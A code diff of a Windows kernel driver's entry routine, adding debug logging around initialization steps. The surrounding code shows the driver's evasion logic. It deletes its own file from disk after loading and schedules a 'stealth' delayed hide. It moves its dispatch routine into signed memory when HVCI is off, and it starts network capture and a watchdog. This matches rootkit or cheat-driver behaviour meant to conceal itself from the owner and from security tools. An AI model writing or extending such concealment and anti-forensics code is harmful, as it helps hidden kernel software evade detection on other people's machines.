@@ -298,7 +298,7 @@ static VOID DeleteDriverOnDisk(PUNICODE_STRING RegistryPath)
         imagePath.Length = (USHORT)(chars * sizeof(WCHAR));
         imagePath.MaximumLength = (USHORT)dataLen;
 
-        BOOLEAN ok = ForceDeleteFileByPath(&imagePath);
+        ForceDeleteFileByPath(&imagePath);
 
     } else {
     }
@@ -313,9 +313,14 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
         return STATUS_UNSUCCESSFUL;
     }
 
+    WW_LOG("DriverEntry: SetupFunctions OK");
+
     if (!device_names::initialize_names()) {
+        WW_LOG("DriverEntry: initialize_names FAILED");
         return STATUS_UNSUCCESSFUL;
     }
+
+    WW_LOG("DriverEntry: device names initialized");
 
     UNICODE_STRING deviceName = {};
     _RtlInitUnicodeString(&deviceName, device_names::get_device_name());
@@ -333,8 +338,11 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
     );
 
     if (!NT_SUCCESS(status)) {
+        WW_LOG("DriverEntry: IoCreateDevice FAILED status=0x%08lx", status);
         return status;
     }
+
+    WW_LOG("DriverEntry: device created at %p", deviceObject);
 
     UNICODE_STRING symLink = {};
     _RtlInitUnicodeString(&symLink, device_names::get_symlink_name());
@@ -343,9 +351,12 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
     status = _IoCreateSymbolicLink(&symLink, &deviceName);
     if (!NT_SUCCESS(status)) {
+        WW_LOG("DriverEntry: IoCreateSymbolicLink FAILED status=0x%08lx", status);
         _IoDeleteDevice(deviceObject);
         return status;
     }
+
+    WW_LOG("DriverEntry: symlink created");
 
     SetFlag(deviceObject->Flags, DO_BUFFERED_IO);
 
@@ -364,15 +375,19 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
     status = net_capture::initialize(deviceObject);
     if (!NT_SUCCESS(status)) {
+        WW_LOG("DriverEntry: net_capture::initialize FAILED status=0x%08lx", status);
         _IoDeleteSymbolicLink(&symLink);
         _IoDeleteDevice(deviceObject);
         return status;
     }
 
+    WW_LOG("DriverEntry: net_capture initialized");
+
 
     if (DriverObject->DriverSection) {
         auto ldr = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
         PVOID base = ldr->DllBase;
+        WW_LOG("DriverEntry: DriverSection base=%p SizeOfImage=0x%lx", base, ldr->SizeOfImage);
         if (base && _MmIsAddressValid(base)) {
             PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(base);
             if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
@@ -381,34 +396,55 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
                 if (_MmIsAddressValid(nt) && nt->Signature == IMAGE_NT_SIGNATURE) {
                     PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
                     bool found_text = false;
+                    WW_LOG("DriverEntry: PE valid, %u sections", nt->FileHeader.NumberOfSections);
                     for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+                        WW_LOG("DriverEntry: section[%u] name=%.8s VA=0x%lx size=0x%lx",
+                            i, sec[i].Name, sec[i].VirtualAddress, sec[i].Misc.VirtualSize);
                         if (sec[i].Name[0] == '.' && sec[i].Name[1] == 't' &&
                             sec[i].Name[2] == 'e' && sec[i].Name[3] == 'x' &&
                             sec[i].Name[4] == 't') {
                             PVOID text_base = static_cast<UCHAR*>(base) + sec[i].VirtualAddress;
                             ULONG text_size = sec[i].Misc.VirtualSize;
+                            WW_LOG("DriverEntry: .text found at %p size=0x%lx", text_base, text_size);
                             sentinel_bridge::init(text_base, text_size);
                             found_text = true;
                             break;
                         }
                     }
                     if (!found_text) {
+                        WW_LOG("DriverEntry: .text section NOT FOUND");
                     }
+                } else {
+                    WW_LOG("DriverEntry: NT headers invalid");
                 }
+            } else {
+                WW_LOG("DriverEntry: DOS signature invalid");
             }
+        } else {
+            WW_LOG("DriverEntry: base invalid or not valid address: %p", base);
         }
     } else {
+        WW_LOG("DriverEntry: DriverSection is NULL");
     }
 
+    WW_LOG("DriverEntry: starting watchdog...");
     sentinel_bridge::start_watchdog();
+    WW_LOG("DriverEntry: watchdog started, scheduling stealth hide...");
     stealth::ScheduleDelayedHide(DriverObject);
 
     if (!hvci_detect::is_hvci_enabled()) {
+        WW_LOG("DriverEntry: HVCI not enabled, relocating dispatch to signed memory");
         signed_memory::RelocateDispatchToSignedMemory(DriverObject, 0x800);
+    } else {
+        WW_LOG("DriverEntry: HVCI enabled, skipping signed memory relocation");
     }
 
-
+    WW_LOG("DriverEntry: deleting driver on disk...");
     DeleteDriverOnDisk(RegistryPath);
+
+    WW_LOG("DriverEntry: COMPLETE, bridge at %p magic=0x%lx whoswho_tsc=%lld sentinel_tsc=%lld",
+        &sentinel_bridge::g_bridge, sentinel_bridge::g_bridge.magic,
+        sentinel_bridge::g_bridge.whoswho_tsc, sentinel_bridge::g_bridge.sentinel_tsc);
 
     return STATUS_SUCCESS;
 }
